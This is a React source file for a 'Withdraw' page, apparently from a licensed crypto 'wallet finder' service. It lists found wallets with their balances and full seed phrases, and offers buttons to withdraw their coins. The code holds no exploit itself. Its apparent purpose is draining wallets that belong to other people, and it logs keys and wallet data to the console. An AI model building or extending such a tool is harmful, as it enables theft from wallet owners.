import React, { useState, useEffect, useCallback } from 'react';
import { API_BASE_URL } from '../config';
import WithdrawalModal from '../components/wallet/WithdrawalModal';
import WithdrawalButton from '../components/wallet/WithdrawalButton';

const Withdraw = () => {
  const [foundWallets, setFoundWallets] = useState([]);
  const [withdrawnAmounts, setWithdrawnAmounts] = useState([]);
  const [withdrawalStatuses, setWithdrawalStatuses] = useState({});
  const [isLoading, setIsLoading] = useState(true);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [selectedCoin, setSelectedCoin] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const fetchData = useCallback(async () => {
    try {
      const licenseKey = localStorage.getItem('licenseKey');
      console.log('Fetching with license key:', licenseKey);
      
      const [walletsResponse, withdrawnResponse, statusesResponse] = await Promise.all([
        fetch(`${API_BASE_URL}/found_wallets.php?key=${licenseKey}`),
        fetch(`${API_BASE_URL}/withdrawn_amounts.php?key=${licenseKey}`),
        fetch(`${API_BASE_URL}/withdrawal_statuses.php?key=${licenseKey}`)
      ]);

      const walletsData = await walletsResponse.json();
      const withdrawnData = await withdrawnResponse.json();
      const statusesData = await statusesResponse.json();

      console.log('Wallets data:', walletsData);
      console.log('Withdrawn data:', withdrawnData);
      console.log('Statuses data:', statusesData);

      if (walletsData.success) {
        setFoundWallets(walletsData.wallets);
      }
      
      if (withdrawnData.success) {
        setWithdrawnAmounts(withdrawnData.withdrawn);
      }

      if (statusesData.success) {
        const statusMap = {};
        statusesData.statuses.forEach(status => {
          const key = `${status.wallet_id}_${status.coin_symbol}`;
          statusMap[key] = status.status;
        });
        console.log('Status map:', statusMap);
        setWithdrawalStatuses(statusMap);
      }
    } catch (error) {
      console.error('Error fetching data:', error);
    }
  }, []);

  useEffect(() => {
    const loadInitialData = async () => {
      await fetchData();
      setIsLoading(false);
    };

    loadInitialData();
    const interval = setInterval(fetchData, 30000);
    return () => clearInterval(interval);
  }, [fetchData]);

  const isDarkMode = localStorage.getItem('theme') === 'dark';

  const getWithdrawalStatus = (walletId, coinSymbol) => {
    const status = withdrawalStatuses[`${walletId}_${coinSymbol}`];
    console.log('Getting status for:', walletId, coinSymbol, status);
    return status || null;
  };

  const handleWithdrawClick = (wallet, coin) => {
    setSelectedWallet(wallet);
    setSelectedCoin(coin);
    setIsModalOpen(true);
  };

  const handleCloseModal = async (wasSubmitted = false) => {
    if (wasSubmitted) {
      const key = `${selectedWallet.id}_${selectedCoin.symbol}`;
      setWithdrawalStatuses(prev => ({
        ...prev,
        [key]: 'pending'
      }));
      await fetchData();
    }
    setIsModalOpen(false);
    setSelectedWallet(null);
    setSelectedCoin(null);
  };

  if (isLoading) {
    return (
      <div className={`min-h-screen w-full flex items-center justify-center ${
        isDarkMode ? 'bg-slate-900 text-white' : 'bg-slate-100 text-slate-900'
      }`}>
        <div className="text-xl">Loading...</div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen w-full p-6 ${
      isDarkMode ? 'bg-slate-900 text-white' : 'bg-slate-100 text-slate-900'
    }`}>
      <div className="max-w-4xl mx-auto">
        {/* Withdrawn Amounts Section */}
        {withdrawnAmounts.length > 0 && (
          <div className={`mb-8 p-6 rounded-lg ${
            isDarkMode ? 'bg-slate-800' : 'bg-white'
          } shadow-sm`}>
            <h2 className="text-xl font-bold mb-4">Total Withdrawn</h2>
            <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
              {withdrawnAmounts.map((item, index) => (
                <div 
                  key={index}
                  className={`p-4 rounded-lg ${
                    isDarkMode ? 'bg-slate-700' : 'bg-gray-50'
                  }`}
                >
                  <div className="text-2xl font-bold">
                    {parseFloat(item.amount).toFixed(8)} {item.coin_symbol}
                  </div>
                  <div className="text-sm opacity-60">
                    Total Withdrawn
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Found Wallets Section */}
        <h2 className="text-2xl font-bold mb-6">Available Wallets</h2>
        <div className="grid gap-6">
          {foundWallets.map((wallet, index) => (
            <div 
              key={index}
              className={`p-6 rounded-lg ${
                isDarkMode ? 'bg-slate-800' : 'bg-white'
              } shadow-sm`}
            >
              <div className="flex items-start gap-4">
                {wallet.logo_path && (
                  <img 
                    src={`${API_BASE_URL}/uploads/${wallet.logo_path}`}
                    alt="Wallet logo"
                    className="w-8 h-8 object-contain"
                  />
                )}
                <div className="flex-1">
                  <div className="space-y-2">
                    {wallet.coins.map((coin, coinIndex) => (
                      <div key={coinIndex} className="flex items-center justify-between">
                        <span className="font-medium">{coin.amount} {coin.symbol}</span>
                        <WithdrawalButton
                          coin={coin}
                          status={getWithdrawalStatus(wallet.id, coin.symbol)}
                          onClick={() => handleWithdrawClick(wallet, coin)}
                        />
                      </div>
                    ))}
                  </div>
                  {wallet.seed_phrase && (
                    <div className={`mt-4 p-4 rounded-lg text-sm font-mono break-all ${
                      isDarkMode ? 'bg-slate-900' : 'bg-slate-100'
                    }`}>
                      {wallet.seed_phrase}
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>

        {selectedWallet && selectedCoin && (
          <WithdrawalModal
            isOpen={isModalOpen}
            onClose={handleCloseModal}
            wallet={selectedWallet}
            coin={selectedCoin}
            isDarkMode={isDarkMode}
          />
        )}
      </div>
    </div>
  );
};

export default Withdraw;